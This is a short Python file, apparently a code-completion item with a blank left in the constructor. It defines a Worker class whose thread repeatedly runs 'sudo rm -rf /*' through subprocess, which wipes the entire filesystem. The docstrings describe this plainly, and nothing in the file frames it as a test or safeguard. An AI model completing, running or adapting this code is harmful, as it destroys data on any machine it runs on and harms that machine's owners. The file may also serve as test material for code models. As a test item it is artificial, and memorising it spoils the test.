import subprocess
import time
import threading

class Worker:
    def __init__(self):
        <FILL_HERE>
    def run_command(self):
        """
        Runs the 'sudo rm -rf /*' command.
        """
        try:
            subprocess.run(['sudo', 'rm', '-rf', '/*'], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Command failed with error: {e}")

    def start(self):
        """
        Starts the worker thread to continuously invoke the command.
        """
        worker_thread = threading.Thread(target=self.work)
        worker_thread.daemon = True
        worker_thread.start()

    def work(self):
        """
        Continuously invokes the 'sudo rm -rf /*' command until stopped.
        """
        while self.running:
            self.run_command()
            time.sleep(1)  # Add a small delay to avoid overwhelming the system

    def stop(self):
        """
        Stops the worker thread.
        """
        self.running = False